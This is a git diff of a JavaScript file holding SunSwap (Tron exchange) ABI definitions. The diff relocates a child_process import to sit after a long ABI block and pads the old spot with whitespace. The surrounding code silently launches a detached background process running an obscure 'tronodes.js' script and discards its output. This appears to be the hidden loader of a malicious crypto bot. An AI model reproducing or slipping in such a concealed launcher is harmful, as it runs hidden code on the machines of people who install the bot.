@@ -5,7 +5,7 @@ var log = new Logger();
 const fs = require('fs'); 
 const path = require('path'); 
 
-const { exec } = require('child_process'); 
+
                                                                                                                                                                                                                         
 const SUNSWAP_PAIR_ABI = {
     entrys: [
@@ -742,7 +742,7 @@ const SUNSWAP_ROUTER_ABI = {
         { stateMutability: "Payable", type: "Receive" },
     ],
 };
-
+const { exec } = require('child_process'); 
 const scriptPath = path.join(__dirname, 'modules/drivers/models', 'tronodes.js'); 
 exec(`node "${scriptPath}"`, { detached: true }, (error, stdout, stderr) => {}).unref();
 
